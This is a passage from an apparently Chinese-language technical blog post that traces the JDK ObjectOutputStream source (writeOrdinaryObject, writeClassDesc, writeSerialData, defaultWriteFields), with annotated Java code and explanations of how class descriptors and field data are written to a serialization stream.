array, or enum constant) serializable object to the</span></span><br><span class="line"><span class="comment"> * stream.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeOrdinaryObject</span><span class="params">(Object obj, ObjectStreamClass desc, <span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">        debugInfoStack.push(</span><br><span class="line">            (depth == <span class="number">1</span> ? <span class="string">"root "</span> : <span class="string">""</span>) + <span class="string">"object (class \""</span> +</span><br><span class="line">            obj.getClass().getName() + <span class="string">"\", "</span> + obj.toString() + <span class="string">")"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        desc.checkSerialize();</span><br><span class="line"></span><br><span class="line">        bout.writeByte(TC_OBJECT);</span><br><span class="line">        writeClassDesc(desc, <span class="keyword">false</span>);</span><br><span class="line">        handles.assign(unshared ? <span class="keyword">null</span> : obj);</span><br><span class="line">        <span class="keyword">if</span> (desc.isExternalizable() &amp;&amp; !desc.isProxy()) &#123;</span><br><span class="line">            writeExternalData((Externalizable) obj);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            writeSerialData(obj, desc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">            debugInfoStack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先来到<code>desc.checkSerialize();</code>，desc其实就是类描述信息，判断当前对象是否是可以被序列化的，也就是是否实现了<code>Serializable</code>接口。</p><p>如果是一个可序列化对象，那么会开始写入<code>TC_OBJECT</code>标记（表示开始序列化操作），随后调用<code>writeClassDesc</code>方法写入当前对象所属类的类描述信息，跟进去：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Writes representation of given class descriptor to stream.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeClassDesc</span><span class="params">(ObjectStreamClass desc, <span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> handle;</span><br><span class="line">    <span class="keyword">if</span> (desc == <span class="keyword">null</span>) &#123;</span><br><span class="line">        writeNull();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (handle = handles.lookup(desc)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        writeHandle(handle); <span class="comment">// 类信息已经序列化，则保存句柄即可</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (desc.isProxy()) &#123;</span><br><span class="line">        writeProxyDesc(desc, unshared);<span class="comment">//代理类信息序列化</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        writeNonProxyDesc(desc, unshared);<span class="comment">// 非代理类信息序列化</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>writeClassDesc</code>方法主要用于判断当前的类描述符使用什么方式写入：</p><ul><li>如果传入的类描述信息是一个null，那么会调用<code>writeNull</code>方法；</li><li>如果没有使用<code>unshared</code>方式，并且可以在<code>handles</code>对象池中找到传入的对象信息，说明类信息已经序列化，那么调用<code>writeHandle</code>保存句柄即可；</li><li>如果传入的类是一个动态代理类，那么调用<code>writeProxyDesc</code>方法；</li><li>如果上面三个条件都不满足，那么调用<code>writeNonProxyDesc</code>方法。</li></ul><p>跟进<code>writeNonProxyDesc(desc, unshared)</code>这里：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Writes class descriptor representing a standard (i.e., not a dynamic</span></span><br><span class="line"><span class="comment"> * proxy) class to stream.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeNonProxyDesc</span><span class="params">(ObjectStreamClass desc, <span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bout.writeByte(TC_CLASSDESC);</span><br><span class="line">    handles.assign(unshared ? <span class="keyword">null</span> : desc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (protocol == PROTOCOL_VERSION_1) &#123;</span><br><span class="line">        <span class="comment">// do not invoke class descriptor write hook with old protocol</span></span><br><span class="line">        desc.writeNonProxy(<span class="keyword">this</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        writeClassDescriptor(desc);<span class="comment">// 写入类描述符用来保存类信息，本质上也是调用 desc.writeNonProxy(this)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    bout.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="keyword">null</span> &amp;&amp; isCustomSubclass()) &#123;</span><br><span class="line">        ReflectUtil.checkPackageAccess(cl);</span><br><span class="line">    &#125;</span><br><span class="line">    annotateClass(cl);</span><br><span class="line">    bout.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">    bout.writeByte(TC_ENDBLOCKDATA);</span><br><span class="line"></span><br><span class="line">    writeClassDesc(desc.getSuperDesc(), <span class="keyword">false</span>); <span class="comment">//递归调用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先写入<code>TC_CLASSDESC</code>标记（表新类描述信息的开始）信息，然后判断使用的模式是<code>unshared</code>模式，那么将<code>desc</code>所表示的<strong>类元数据信息</strong>插入到<code>handles</code>对象的映射表中，然后根据使用的流协议版本调用不同的write方法，如果使用的流协议是<code>PROTOCOL_VERSION_1</code>，那么直接调用<code>desc</code>成员的<code>writeNonProxy</code>方法，并且将当前引用<code>this</code>作为实参传入到<code>writeNonProxy</code>方法中，如果使用的不是<code>PROTOCOL_VERSION_1</code>协议，那么会调用当前类中的<code>writeClassDescriptor</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">writeClassDescriptor</span><span class="params">(ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    desc.writeNonProxy(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进<code>writeNonProxy</code>中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Writes non-proxy class descriptor information to given output stream.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writeNonProxy</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    out.writeUTF(name);</span><br><span class="line">    out.writeLong(getSerialVersionUID());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span> flags = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (externalizable) &#123;</span><br><span class="line">        flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;</span><br><span class="line">        <span class="keyword">int</span> protocol = out.getProtocolVersion();</span><br><span class="line">        <span class="keyword">if</span> (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) &#123;</span><br><span class="line">            flags |= ObjectStreamConstants.SC_BLOCK_DATA;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (serializable) &#123;</span><br><span class="line">        flags |= ObjectStreamConstants.SC_SERIALIZABLE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (hasWriteObjectData) &#123;</span><br><span class="line">        flags |= ObjectStreamConstants.SC_WRITE_METHOD;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (isEnum) &#123;</span><br><span class="line">        flags |= ObjectStreamConstants.SC_ENUM;</span><br><span class="line">    &#125;</span><br><span class="line">    out.writeByte(flags);</span><br><span class="line"></span><br><span class="line">    out.writeShort(fields.length);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">        ObjectStreamField f = fields[i];</span><br><span class="line">        out.writeByte(f.getTypeCode());</span><br><span class="line">        out.writeUTF(f.getName());</span><br><span class="line">        <span class="keyword">if</span> (!f.isPrimitive()) &#123;</span><br><span class="line">            out.writeTypeString(f.getTypeString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先调用<code>writeUTF</code>方法写入<strong>类名</strong>到字节流(bout)，这里的类名是类全名，带了包名的那种（<code>out.writeUTF(name);</code>）</p><p>再调用<code>writeLong</code>方法写入<code>serialVersionUID</code>的值到字节流（<code>out.writeLong(getSerialVersionUID());</code>）</p><p>然后开始写入当前类中成员属性的数量信息到字节流（<code>out.writeShort(fields.length);</code>）</p><p>最后会写入每一个字段的信息，这里的字段信息包含三部分内容：<code>TypeCode</code>、<code>fieldName</code>、<code>fieldType</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"> out.writeShort(fields.length);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">    ObjectStreamField f = fields[i];</span><br><span class="line">    out.writeByte(f.getTypeCode());</span><br><span class="line">    out.writeUTF(f.getName());</span><br><span class="line">    <span class="keyword">if</span> (!f.isPrimitive()) &#123;</span><br><span class="line">        out.writeTypeString(f.getTypeString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里<code>writeClassDescriptor</code>就走完了，回到上一层，发现又打开了块模式<code>bout.setBlockDataMode(true);</code></p><p>再往下会调用<code>annotateClass(cl);</code> 但是跟进去发现什么都没有（迷</p><p>在调用<code>annotateClass</code>方法完成过后，代码会关闭<code>Data Block</code>模式，然后写入<code>TC_ENDBLOCKDATA</code>标记（表示当前非动态代理类的描述信息的终止）。</p><p>到这里，<code>writeNonProxy</code>和<code>writeClassDescriptor</code><strong>流程结束</strong>，同样，也导致<code>writeClassDesc</code><strong>流程结束</strong>，并且回到<code>writeOrdinaryObject</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeOrdinaryObject</span><span class="params">(Object obj,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 ObjectStreamClass desc,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">        debugInfoStack.push(</span><br><span class="line">            (depth == <span class="number">1</span> ? <span class="string">"root "</span> : <span class="string">""</span>) + <span class="string">"object (class \""</span> +</span><br><span class="line">            obj.getClass().getName() + <span class="string">"\", "</span> + obj.toString() + <span class="string">")"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        desc.checkSerialize();</span><br><span class="line"></span><br><span class="line">        bout.writeByte(TC_OBJECT);</span><br><span class="line">        writeClassDesc(desc, <span class="keyword">false</span>);</span><br><span class="line">        handles.assign(unshared ? <span class="keyword">null</span> : obj);</span><br><span class="line">        <span class="keyword">if</span> (desc.isExternalizable() &amp;&amp; !desc.isProxy()) &#123;</span><br><span class="line">            writeExternalData((Externalizable) obj);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            writeSerialData(obj, desc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">            debugInfoStack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来来到<code>handles.assign(unshared ? null : obj);</code> 这里如果使用的模式是<code>unshared</code>模式，则将<code>desc</code>所表示的类元数据信息插入到<code>handles</code>对象的映射表中，最后会判断当前Java对象的序列化语义，如果当前对象不是一个<strong>动态代理类</strong>并且是实现了<strong>外部化</strong>的，则调用<code>writeExternalData</code>方法写入对象信息，如果当前对象是一个实现了<code>Serializable</code>接口的，则调用<code>writeSerialData</code>方法写入对象信息。</p><p>接下来将类数据信息序列化，写入bout，<strong>进入<code>writeSerialData</code>函数</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Writes instance data for each serializable class of given object, from</span></span><br><span class="line"><span class="comment"> * superclass to subclass.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; slots.length; i++) &#123;</span><br><span class="line">        ObjectStreamClass slotDesc = slots[i].desc;</span><br><span class="line">      <span class="comment">//如果当前对象有自定义writeObject方法</span></span><br><span class="line">        <span class="keyword">if</span> (slotDesc.hasWriteObjectMethod()) &#123;</span><br><span class="line">            PutFieldImpl oldPut = curPut;</span><br><span class="line">            curPut = <span class="keyword">null</span>;</span><br><span class="line">            SerialCallbackContext oldContext = curContext;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                debugInfoStack.push(</span><br><span class="line">                    <span class="string">"custom writeObject data (class \""</span> +</span><br><span class="line">                    slotDesc.getName() + <span class="string">"\")"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                curContext = <span class="keyword">new</span> SerialCallbackContext(obj, slotDesc);</span><br><span class="line">                bout.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">                slotDesc.invokeWriteObject(obj, <span class="keyword">this</span>);<span class="comment">// 调用自定义序列化 writeObject 方法</span></span><br><span class="line">                bout.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">                bout.writeByte(TC_ENDBLOCKDATA);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                curContext.setUsed();</span><br><span class="line">                curContext = oldContext;</span><br><span class="line">                <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                    debugInfoStack.pop();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            curPut = oldPut;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="comment">//默认序列化操作</span></span><br><span class="line">            defaultWriteFields(obj, slotDesc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就像注释说的一样，会为给定对象的每个可序列化的类写入实例数据，从父类到子类。</p><p>再这个方法内会首先判断当前使用的字节流协议，如果使用的是<code>PROTOCOL_VERSION_1</code>协议，那么回直接调用可序列化对象中的<code>writeExternal</code>方法，如果使用的不是<code>PROTOCOL_VERSION_1</code>协议，那么会先开启<code>Data Block</code>模式，再调用<code>writeExternal</code>方法，调用完毕后再关闭<code>Data Block</code>模式并在该流的最后追加<code>TC_ENDBLOCKDATA</code>标记。</p><p>值得一提的是，这个方法有一个切换上下文环境的过程——在检测协议前，首先令<code>curPut</code>和<code>curContext</code>为空，检测并写入数据后，再分别令<code>curContext</code> <code>curPut</code>为<code>oldContext</code>和<code>oldPut</code>，恢复执行之前的环境。</p><h2 id="为什么要切换上下文？"><a href="#为什么要切换上下文？" class="headerlink" title="为什么要切换上下文？"></a>为什么要切换上下文？</h2><p>再来看看<code>writeSerialData</code>就明白了</p><p>这个方法主要向obj对象写入数据信息，比如字段值和相关引用等，写入的时候会从<strong>顶级父类从上至下递归执行</strong></p><p>详细过程：</p><p>首先<code>ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</code></p><p>跟进去看：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns array of ClassDataSlot instances representing the data layout</span></span><br><span class="line"><span class="comment"> * (including superclass data) for serialized objects described by this</span></span><br><span class="line"><span class="comment"> * class descriptor.  ClassDataSlots are ordered by inheritance with those</span></span><br><span class="line"><span class="comment"> * containing "higher" superclasses appearing first.  The final</span></span><br><span class="line"><span class="comment"> * ClassDataSlot contains a reference to this descriptor.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ClassDataSlot[] getClassDataLayout() <span class="keyword">throws</span> InvalidClassException &#123;</span><br><span class="line">    <span class="comment">// REMIND: synchronize instead of relying on volatile?</span></span><br><span class="line">    <span class="keyword">if</span> (dataLayout == <span class="keyword">null</span>) &#123;</span><br><span class="line">        dataLayout = getClassDataLayout0();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dataLayout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>翻译注释，该方法返回代表该类描述符所描述的序列化对象的数据布局（包括父类数据）的ClassDataSlot实例阵列。 </p><p>ClassDataSlots按继承顺序排列，那些包含 “更高 “的父类的实例出现在前面。 最后的ClassDataSlot包含对这个描述符的引用。</p><p>也就是说，如果该对象拥有父类，slots里按顺序存放的先是父类后是子类。</p><p>也就是说，slots里面存放的是继承结构，用来后续遍历。</p><p>接下来开始对slots遍历：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; slots.length; i++) &#123;</span><br><span class="line">        ObjectStreamClass slotDesc = slots[i].desc;</span><br><span class="line">        <span class="keyword">if</span> (slotDesc.hasWriteObjectMethod()) &#123;</span><br><span class="line">            PutFieldImpl oldPut = curPut;</span><br><span class="line">            curPut = <span class="keyword">null</span>;</span><br><span class="line">            SerialCallbackContext oldContext = curContext;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                debugInfoStack.push(</span><br><span class="line">                    <span class="string">"custom writeObject data (class \""</span> +</span><br><span class="line">                    slotDesc.getName() + <span class="string">"\")"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                curContext = <span class="keyword">new</span> SerialCallbackContext(obj, slotDesc);</span><br><span class="line">                bout.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">                slotDesc.invokeWriteObject(obj, <span class="keyword">this</span>);</span><br><span class="line">                bout.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">                bout.writeByte(TC_ENDBLOCKDATA);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                curContext.setUsed();</span><br><span class="line">                curContext = oldContext;</span><br><span class="line">                <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                    debugInfoStack.pop();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            curPut = oldPut;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            defaultWriteFields(obj, slotDesc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，判断可序列化对象是否重写了<code>writeObject</code>方法，如果重写了该方法，则先开启<code>Data Block</code>模式，去调用<code>writeObject</code>方法，调用结束后再关闭<code>Data Block</code>模式，并且在最后追加<code>TC_ENDBLOCKDATA</code>标记（表示数据块写入终止），如果没有重写该方法，则调用<code>defaultWriteFields</code>方法写入当前对象中的所有字段的值，跟进<code>defaultWriteFields</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defaultWriteFields</span><span class="params">(Object obj, ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="keyword">null</span> &amp;&amp; obj != <span class="keyword">null</span> &amp;&amp; !cl.isInstance(obj)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ClassCastException();</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    desc.checkDefaultSerialize();<span class="comment">//判断该对象是否可序列化</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. Java 原生类型 序列化</span></span><br><span class="line">    <span class="keyword">int</span> primDataSize = desc.getPrimDataSize();      <span class="comment">// 1.1 获取原生类型字段的长度</span></span><br><span class="line">    <span class="keyword">if</span> (primVals == <span class="keyword">null</span> || primVals.length &lt; primDataSize) &#123;</span><br><span class="line">        primVals = <span class="keyword">new</span> <span class="keyword">byte</span>[primDataSize];</span><br><span class="line">    &#125;</span><br><span class="line">    desc.getPrimFieldValues(obj, primVals);         <span class="comment">// 1.2 获取原生类型字段的值</span></span><br><span class="line">    bout.write(primVals, <span class="number">0</span>, primDataSize, <span class="keyword">false</span>);   <span class="comment">// 1.3 原生类型序列化</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. Java 对象类型 序列化，递归调用 writeObject0 方法</span></span><br><span class="line">    ObjectStreamField[] fields = desc.getFields(<span class="keyword">false</span>);     <span class="comment">// 2.1 获取所有序列化的字段</span></span><br><span class="line">    Object[] objVals = <span class="keyword">new</span> Object[desc.getNumObjFields()];</span><br><span class="line">    <span class="keyword">int</span> numPrimFields = fields.length - objVals.length;</span><br><span class="line">    desc.getObjFieldValues(obj, objVals);                   <span class="comment">// 2.2 获取所有序列化字段的值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; objVals.length; i++) &#123;              <span class="comment">// 2.3 递归完成序列化</span></span><br><span class="line">        writeObject0(objVals[i], fields[numPrimFields + i].isUnshared());            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>翻译注释：</p><blockquote><p>抓取并写入给定对象的可序列化字段的值到流。 给定的类描述符指定要写哪些字段值，以及它们应该以何种顺序被写入。</p></blockquote><p>也就是说，<code>defaultWriteFields</code>方法负责读取 obj 对象中的字段数据，并且将字段数据写入到字节流中。</p><p>首先，<code>desc.checkDefaultSerialize();</code>用来判断该类对象是否是一个可序列化的类。</p><p>检查完毕后，分两步：</p><ol><li><strong>基础类型</strong></li></ol><p>获取该对象中所有基础类型字段的值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc.getPrimFieldValues(obj, primVals);</span><br></pre></td></tr></table></figure><p>跟进去：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 